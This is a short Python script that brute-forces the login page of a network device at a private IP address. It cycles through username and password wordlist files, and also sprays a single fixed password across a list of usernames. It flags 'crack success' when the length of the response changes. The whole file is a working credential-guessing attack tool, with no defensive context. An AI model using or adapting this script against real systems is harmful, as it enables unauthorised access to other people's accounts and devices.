import requests

def login(index, username, password):
    if username is None or len(username) == 0:
        return;
    if password is None or len(password) == 0:
        return;

    url = 'http://10.198.1.1/login.cgi'
    payload = {'user': username, 'password': password}
    resp = requests.post(url, data=payload)
    if resp.status_code != 200:
        print("Error: status_code=" + resp.status_code)
    print(str(index) + "---" + username + ", " + password + ', ' + str(len(resp.text)))
    if len(resp.text) != 155:
        print('crack success!!!!!!!!')
        return True
    return False


def loginFromFile(usernameFile, passwordFile):
    index = 0
    with open(usernameFile) as f:
        while True:
            username = f.readline().strip('\n')
            if not username:
                break
            with open(passwordFile) as f1:
                while True:
                    password = f1.readline().strip('\n')
                    if not password:
                        break
                    flag = login(index, username.strip(), password.strip())
                    index += 1
                    if flag:
                        return

def loginFromFile1(usernameFile, passwordFile):
    index = 0
    with open(usernameFile) as f:
        while True:
            username = f.readline().strip('\n')
            if not username:
                break
            flag = login(index, username.strip(), '13798241617')
            index += 1
            if flag:
                return


#loginFromFile1('files/name_cn.txt', 'files/PassWord2.txt')

login(22, 'admin', '111111')